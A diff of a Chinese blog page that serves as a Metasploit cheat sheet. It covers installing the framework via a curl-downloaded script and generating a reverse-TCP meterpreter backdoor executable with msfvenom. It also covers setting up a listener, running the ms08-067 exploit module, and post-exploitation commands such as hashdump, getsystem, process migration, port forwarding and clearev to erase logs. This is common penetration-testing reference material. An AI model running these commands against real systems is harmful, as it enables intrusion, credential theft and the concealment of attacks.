@@ -24,8 +24,9 @@
 <meta property="og:description" content="MetaSploit工具安装1234curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstallchmod 777 msfinstall.&#x2F;msfinstallms">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-14T08:45:01.000Z">
-<meta property="article:modified_time" content="2023-09-03T06:12:07.482Z">
+<meta property="article:modified_time" content="2023-09-09T09:47:28.056Z">
 <meta property="article:author" content="fuming">
+<meta property="article:tag" content="安全工具">
 <meta name="twitter:card" content="summary_large_image">
   
   
@@ -219,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          553 字
+          1.5k 字
         
       </span>
     
@@ -230,7 +231,7 @@
         
         
         
-          4 分钟
+          9 分钟
         
       </span>
     
@@ -276,14 +277,18 @@
                 <h1 id="MetaSploit"><a href="#MetaSploit" class="headerlink" title="MetaSploit"></a>MetaSploit</h1><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/rapid7/m</span>etasploit-omnibus<span class="hljs-regexp">/master/</span>config<span class="hljs-regexp">/templates/m</span>etasploit-framework-wrappers/msfupdate.erb &gt; msfinstall<br>chmod <span class="hljs-number">777</span> msfinstall<br>./msfinstall<br>msfconsole<br></code></pre></td></tr></table></figure>
 
 <h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>使用 <code>msfvenom</code> 进行 msf 后门生成，工具参数：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">-p					# 指定需要使用的payload(攻击荷载)<br>-l					# 列出指定模块的所有可用资源<br>-n					# 为payload预先指定一个NOP滑动长度<br>-f					# 指定输出格式<br>-e					# 指定需要使用的encoder编码器<br>-a					# 指定payload的目标架构<br>-s					# 设定有效攻击荷载的最大长度<br>-b  				# 设定规避字符集<br>-i  				# 指定payload的编码次数<br>--platform			# 指定payload的目标平台<br>--shellest  		# 最小化生成payload<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">-p					# 指定需要使用的payload(攻击荷载)<br>-l					# 列出指定模块的所有可用资源<br>-n					# 为payload预先指定一个NOP滑动长度<br>-f					# 指定输出格式<br>-e					# 指定需要使用的encoder编码器<br>-a					# 指定payload的目标架构<br>-s					# 设定有效攻击荷载的最大长度<br>-b  				# 设定规避字符集<br>-i  				# 指定payload的编码次数<br>--platform			# 指定payload的目标平台<br>--shellest  		# 最小化生成payloa<br></code></pre></td></tr></table></figure>
 
-<p><code>payload</code>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">windows</span><br>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.254.128 lport=4444 -f exe -o msf.exe<br></code></pre></td></tr></table></figure>
+<p>生成后门：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.254.128 <span class="hljs-attribute">lport</span>=4444 -f exe -o msf.exe<br></code></pre></td></tr></table></figure>
 
+<p>启动监听：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">use  exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 0.0.0.0<br>set LPORT 4444<br>exploit<br></code></pre></td></tr></table></figure>
 
+<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">启动MSF</span><br>msfconsole	<br><span class="hljs-meta prompt_"># </span><span class="language-bash">搜索某个模块</span><br>search ms08-067<br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用某个模块, 也可以使用 search 后的 <span class="hljs-built_in">id</span></span><br>use exploit/windows/smb/ms08-067_netapi<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前模块可以使用的payload</span><br>show payloads<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前模块需要的参数配置</span><br>show options<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置 payload</span><br>set payload windows/meterpreter/reverse_tcp<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置目标的IP地址</span><br>set RHOST 192.168.10.1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置本地的IP地址</span><br>set LHOST 192.168.1.1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置本地的监听端口</span><br>set LPORT 8888<br><span class="hljs-meta prompt_"># </span><span class="language-bash">开始</span><br>run<br></code></pre></td></tr></table></figure>
 
-
+<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>在获取 Shell 后可以使用的命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">挂起</span><br>background<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看会话</span><br>sessions<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入该会话</span><br>sessions -i id<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取远程命令执行 Shell, 可用 <span class="hljs-built_in">exit</span> 退出</span><br>shell<br><span class="hljs-meta prompt_"># </span><span class="language-bash">解决 windows shell 乱码</span><br>chcp 65001<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看</span><br>cat<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取系统工作的当前目录</span><br>getwd<br><span class="hljs-meta prompt_"># </span><span class="language-bash">文件上传</span><br>upload [要上传的文件] [要上传的位置]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">文件下载</span><br>download [要下载的文件] [下载放到那]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">调用 vi 编辑器</span><br>edit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">搜索文件</span><br>search<br><span class="hljs-meta prompt_"># </span><span class="language-bash">端口转发</span><br>portfwd add -l 1122 -p 3389 -r 192.168.10.1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看路由</span><br>route<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取当前用户信息</span><br>getuid<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看系统信息</span><br>sysinfo<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看</span><br>ps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进程迁移 ps 查看进程, migrate 迁移</span><br>migrate<br><span class="hljs-meta prompt_"># </span><span class="language-bash">运行可执行文件</span><br>execute -f -i -H cmd.exe<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭</span><br>shutdown<br><span class="hljs-meta prompt_"># </span><span class="language-bash">尝试提权</span><br>getsystem<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取 <span class="hljs-built_in">hash</span> 信息</span><br>hashdump<br><span class="hljs-meta prompt_"># </span><span class="language-bash">入侵痕迹清除</span><br>clearev<br></code></pre></td></tr></table></figure>
 
 
                 
@@ -293,6 +298,41 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" class="category-chain-item">安全工具</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">#安全工具</a>
+      
+    </div>
   
 </div>
 
